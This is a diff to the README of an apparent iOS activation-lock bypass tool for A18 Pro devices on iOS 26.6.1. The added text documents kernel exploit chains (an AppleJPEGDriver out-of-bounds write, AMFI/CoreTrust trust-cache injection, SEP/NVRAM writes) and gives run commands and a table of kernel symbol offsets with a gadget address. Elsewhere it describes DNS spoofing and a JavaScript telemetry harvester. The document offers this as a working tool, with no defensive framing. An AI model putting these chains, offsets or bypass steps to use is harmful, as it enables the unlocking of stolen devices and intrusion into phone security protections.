@@ -15,9 +15,13 @@
 4. **iOS 26.6.1 MobileActivation & Albert DRM Protocol**:
    Implements full IngestBody / CollectionBlob decoding, Albert DRM handshake proxying (`https://albert.apple.com/deviceservices/drmHandshake`), 5-stage online activation pipeline, and offline A18 Pro activation record synthesis.
 5. **Persistent PurpleBuddy & Flag Injection**:
-   Injects configuration keys (`PurpleBuddy`, `SkipSetup`, `allow-hactivation`, `FDRForceLegacySigning`, `FillmoreBypassOTDataPersist`) directly into lockdown storage.
+   Injects configuration keys (`PurpleBuddy`, `SkipSetup`, `allow-hactivation`, `FDRForceLegacySigning`, `FillmoreBypassOTDataPersist`) plus expanded `com.apple.springboard`, `com.apple.SetupAssistant`, and `com.apple.purplebuddy` keys directly into lockdown storage.
 6. **Local Captive Portal & WebSheet Research Assistant**:
    Full-featured multi-threaded DNS spoofer, CNA probe handler (`/hotspot-detect.html`), WebSheet JavaScript telemetry harvester, URL scheme fuzzer (`prefs:`, `diags:`, `shoebox:`, `itms-services:`), dynamic `.mobileconfig` / Root CA exporter, OpenSSL TLS pinning inspector, and host web dashboard (`/admin`).
+7. **Neo-Chain Kernel Exploitation Framework**:
+   Unified kernel exploit orchestration for A18 Pro (no MTE mitigation). Primary path: V-047 AppleJPEGDriver OOB write; fallback: AppleMCCUserClientV2 testMode. Integrates AMFI/CoreTrust bypass via `trust_cache_rt` injection, SEP/NVRAM write via PMAP, and proc enumeration via `allproc`. Uses verified iOS 26.6.1 T8140 offsets from `kernel-deltas/state/t8140/26.6.1-23G83.txt`.
+8. **Sovereign-Chain & Sovereign-Lite Hybrid Bypass**:
+   Userspace security-degradation chains that apply dual-vector memory pressure (NECP + IOSurface) and AI guardrail AFC overrides before activation bypass. Sovereign-Chain runs the full 5-stage bypass; Sovereign-Lite pivots to lockdown injection, notification burst, and respring without activation/race stages.
 
 ---
 
@@ -52,6 +56,17 @@ graph TD
     J --> J2[HTTP Captive Server :80 / :8080]
     J --> J3[TLS Pinning Inspector :443 / :8443]
     J --> J4[Host Admin Dashboard /admin]
+
+    A --> K[Advanced Bypass Chains]
+    K --> K1[Bypass-Full: 5-Stage TOCTOU Chain]
+    K --> K2[Sovereign-Chain: Memory Pressure + Bypass]
+    K --> K3[Sovereign-Lite: Injection + Notification]
+    K --> K4[Neo-Chain: Kernel R/W + AMFI + SEP]
+
+    K4 --> L1[AppleJPEGDriver V-047 OOB]
+    K4 --> L2[AppleMCCUserClientV2 TestMode]
+    K4 --> L3[trust_cache_rt Injection]
+    K4 --> L4[NVRAM Write via PMAP]
 ```
 
 ---
@@ -67,6 +82,7 @@ graph TD
 | **Target Build Version** | `23G83` |
 | **Port DFU USB VID/PID** | `05AC:F014` |
 | **Normal Lockdown USB VID/PID** | `05AC:12A8` |
+| **Kernel Offset Source** | `kernel-deltas/state/t8140/26.6.1-23G83.txt` |
 
 ---
 
@@ -76,7 +92,7 @@ graph TD
 l0fck/
 ├── Makefile                          # Build configuration linking libimobiledevice, libusb, openssl, curl
 ├── README.md                         # Technical documentation
-├── start.sh                          # Interactive guided terminal interface
+├── start.sh                          # Interactive grouped terminal menu with confirmation screens
 ├── include/
 │   ├── l0fck.h                       # Master header and global structures
 │   ├── core/
@@ -103,7 +119,15 @@ l0fck/
 │       ├── preboard_triage.h         # Live crash triage & register analyzer
 │       ├── preboard_exploit.h        # Weaponized preboard privilege escalation
 │       ├── springboard_injector.h    # Setup dismissal & disk preference staging
-│       ├── bypass_chain.h            # 5-stage automated activation bypass engine
+│       ├── bypass_chain.h            # Bypass engines: full, sovereign, neo-chain
+│       ├── kernel_exploit.h          # Unified kernel R/W primitive framework
+│       ├── kernel_offsets.h          # iOS 26.6.1 T8140 verified kernel offsets
+│       ├── amfi_bypass.h             # AMFI HSP disable & proc enumeration
+│       ├── coretrust_bypass.h        # trust_cache_rt injection & validation patch
+│       ├── cvmserver_exploit.h       # CVMServer cdhash registration (userspace)
+│       ├── sep_bypass.h              # SEP enforcement & NVRAM activated-state write
+│       ├── sandbox_escape.h          # bad_query container path traversal
+│       ├── tls_bypass.h              # TLS pinning bypass for Albert/WebKit clients
 │       ├── captive_server.h          # Captive server engine & lifecycle
 │       ├── captive_dns.h             # Selective DNS query parser & A-record spoofer
 │       ├── captive_http.h            # Multi-endpoint HTTP dispatcher & REST API
@@ -135,13 +159,67 @@ l0fck/
         ├── preboard_triage.c
         ├── preboard_exploit.c
         ├── springboard_injector.c
-        ├── bypass_chain.c
+        ├── bypass_chain.c            # bypass-full, sovereign, sovereign-lite, neo-chain
+        ├── kernel_exploit.c
+        ├── applejpegdriver_exploit.c # V-047 OOB write (primary kernel primitive)
+        ├── applemcc_exploit.c        # AppleMCCUserClientV2 testMode (fallback)
+        ├── amfi_bypass.c
+        ├── coretrust_bypass.c
+        ├── cvmserver_exploit.c
+        ├── sep_bypass.c
+        ├── sandbox_escape.c
+        ├── tls_bypass.c
         ├── captive_server.c
         ├── captive_dns.c
         ├── captive_http.c
         ├── captive_payloads.c
         └── captive_tls.c
 ```
+
+---
+
+## Interactive Menu (`start.sh`)
+
+The interactive interface has been redesigned into grouped sections with confirmation screens. Before every action, the menu shows the command, required device state, risk level, documentation summary, and ASCII flow diagram, then prompts `Proceed? [Y/n]:`.
+
+| Section | Contents |
+|---|---|
+| **1. Device Discovery** | `--detect`, `--port-dfu`, `--usb-scan` |
+| **2. Lockdown / AFC** | `--probe-services`, `--afc-ls`, `--inject-flags`, `--verify-flags`, `--syslog`, `--reboot` |
+| **3. Activation / Albert** | `--probe-albert`, `--activate-online`, `--activate-race`, `--deactivate` |
+| **4. Preboard / Setup Assistant** | `--crash-preboard`, `--triage-crash`, `--stage-bypass`, `--exploit-preboard` |
+| **5. Captive Portal** | `--captive-server`, `--export-profile` |
+| **6. Advanced Chains** | `--bypass-full`, `--bypass-watch`, `--sovereign`, `--sovereign-lite`, `--neo-chain` |
+| **7. Diagnostics** | `--test`, `--test-kernel-exploit`, `--test-amfi-bypass` |
+
+```bash
+./start.sh
+```
+
+---
+
+## Bypass Chain Comparison
+
+| Chain | CLI Flag | Stages | Kernel Exploit | Activation Race |
+|---|---|---|---|---|
+| **Bypass-Full** | `--bypass-full` | AFC staging → online/VUL 23 race → triage → notifications → SpringBoard | No | Yes |
+| **Bypass-Watch** | `--bypass-watch` | Auto-triggers bypass-full on USB connect | No | Yes |
+| **Sovereign-Chain** | `--sovereign` | Memory pressure → AI guardrails → bypass-full | No | Yes |
+| **Sovereign-Lite** | `--sovereign-lite` | Memory pressure → AI guardrails → flag injection → notifications → respring | No | No |
+| **Neo-Chain** | `--neo-chain` | Recon → kernel R/W → AMFI/CoreTrust → SEP/NVRAM → persistence → verify | Yes | No |
+
+### Neo-Chain Stages (`--neo-chain`)
+
+```
+Stage 0: Recon (A18 Pro detection, MTE absence confirmation)
+Stage 1: Kernel R/W (V-047 AppleJPEGDriver OOB, fallback: MCC testMode)
+Stage 2: AMFI / CoreTrust (CVMServer cdhash + trust_cache_rt injection)
+Stage 3: SEP / MobileActivation (NVRAM write via PMAP; SEP mailbox blocked)
+Stage 4: Persistence (AFC staging; IOMFB NVMe EAN blocked)
+Stage 5: Cleanup (Darwin notifications, respring, verification)
+```
+
+Blocked exploit paths (DarkSword pe_v2, PUAF, `proc.p_flag`, IOMFB EAN, mobileactivationd patch) are tracked in `PLAN/awaiting_offsets.txt`.
 
 ---
 
@@ -183,7 +261,28 @@ make clean && make
 ./l0fck --bypass-watch
 ```
 
-### 3. Preboard Exploitation & Triage Tools
+### 3. Sovereign-Chain & Sovereign-Lite
+```bash
+# Hybrid security degradation: memory pressure + AI guardrails + full bypass chain
+./l0fck --sovereign
+
+# Lightweight variant: memory pressure + AI guardrails + flag injection + notifications + respring
+./l0fck --sovereign-lite
+```
+
+### 4. Neo-Chain Kernel Exploitation
+```bash
+# Full Neo-Chain: kernel R/W -> AMFI/CoreTrust -> SEP/NVRAM -> persistence -> verify
+./l0fck --neo-chain
+
+# Isolated kernel R/W primitive test (V-047, MCC fallback, allproc probe)
+./l0fck --test-kernel-exploit
+
+# Isolated AMFI/CoreTrust bypass test (proc walk + trust_cache_rt injection)
+./l0fck --test-amfi-bypass
+```
+
+### 5. Preboard Exploitation & Triage Tools
 ```bash
 # Trigger preboard crash PoC (Vulnerability #23)
 ./l0fck --crash-preboard
@@ -201,9 +300,9 @@ make clean && make
 ./l0fck --dismiss-setup
 ```
 
-### 4. General Diagnostics & Exploitation Modules
+### 6. General Diagnostics & Exploitation Modules
 ```bash
-# Run embedded self-tests (12/12 test verification)
+# Run embedded self-tests (12/12 test verification, host-only)
 ./l0fck --test
 
 # Detect connected device and evaluate A18 Pro / iOS 26.6.1 compatibility
@@ -227,3 +326,31 @@ make clean && make
 # Launch local Captive Portal WebSheet server (User-space ports 8080/5353/8443)
 ./l0fck --captive-server 8080 --captive-dns-port 5353 --captive-tls-port 8443
 ```
+
+---
+
+## Kernel Offsets (iOS 26.6.1 / T8140)
+
+Neo-Chain components use verified non-zero offsets from `kernel-deltas/state/t8140/26.6.1-23G83.txt`. Key symbols:
+
+| Symbol | Address |
+|---|---|
+| `kalloc_data_external` | `0xfffffff00a6cc6f8` |
+| `kfree_data_external` | `0xfffffff00a6cce30` |
+| `allproc` | `0xfffffff00b23a880` |
+| `trust_cache_rt` | `0xfffffff007cdab20` |
+| `load_static_trust_cache` | `0xfffffff00abe4888` |
+| `pmap_enter_options_addr` | `0xfffffff00a80f198` |
+| `str_x8_x0` (gadget) | `0xfffffff00a68c33c` |
+
+Unresolved offsets (`proc.p_flag`, thread machine fields, SEP mailbox, IOMFB EAN) are documented in `PLAN/awaiting_offsets.txt`. Deprecated iOS 26.0.x offsets from Apple-Bug-Bounty-Skill must not be used.
+
+---
+
+## Recent Changes (since last push)
+
+- **Neo-Chain framework**: kernel exploit orchestration, AMFI/CoreTrust/SEP modules, CLI flags (`--neo-chain`, `--test-kernel-exploit`, `--test-amfi-bypass`)
+- **Sovereign-Chain / Sovereign-Lite**: hybrid security-degradation bypass chains (`--sovereign`, `--sovereign-lite`)
+- **Interactive menu redesign**: grouped 7-section menu with per-action confirmation screens, documentation, and ASCII flow diagrams
+- **Expanded flag injection**: additional `com.apple.purplebuddy`, `com.apple.springboard`, and `com.apple.SetupAssistant` keys
+- **Expanded notification burst**: additional FUD/UARP/update notifications, 5 burst cycles (was 2), 30ms spacing (was 15ms)
